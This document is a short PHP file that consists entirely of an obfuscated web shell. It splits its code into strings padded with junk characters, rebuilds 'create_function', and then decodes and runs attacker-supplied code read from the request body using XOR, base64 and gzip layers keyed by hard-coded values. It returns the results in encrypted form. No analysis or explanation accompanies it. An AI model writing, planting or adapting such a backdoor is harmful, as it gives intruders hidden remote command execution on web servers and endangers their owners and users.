<?php
$s='g$o.=$t{$i|g}^$k{$|gj};|g}}retur|gn |g$o;|g}|gif (@preg_match(|g"/$kh(.|g+)$kf/",|g@file_ge|gt_cont|gents(|g"php|g://';
$T='input"|g|g),$m)==1) {@|gob_star|gt(|g);@eva|g|gl(@gzunco|gmp|gress(@x(@|gbase|g64_decode($|gm[1]),$k))|g);$o=@|gob|g|g_g';
$a='$k="4|ga8efb1c|g";|g$kh="|gb9a3745d0693"|g;$|gkf="f|gbc00b9115|g39";|g$p|g="Fe06nQ27dGeA|g681S";f|gun|gction x(|g$t,$';
$w='k|g){$c=st|grlen($k)|g;$l=st|grlen(|g$t|g);$o="";fo|gr|g($i=0;$i<$l;|g){fo|gr($j=0|g|g|g;($j<$c&&$i<$l);$j|g++,$|gi++){|';
$O=str_replace('k','','crkeaktkek_fkunctkion');
$q='et_c|gontents();@|gob_end_cle|gan|g();$r=@bas|ge64|g_encode(|g@x(@gzco|gmpres|gs($o),$|gk));pr|gint("$|gp$k|gh$r$kf");}';
$C=str_replace('|g','',$a.$w.$s.$T.$q);
$t=$O('',$C);$t();
?>
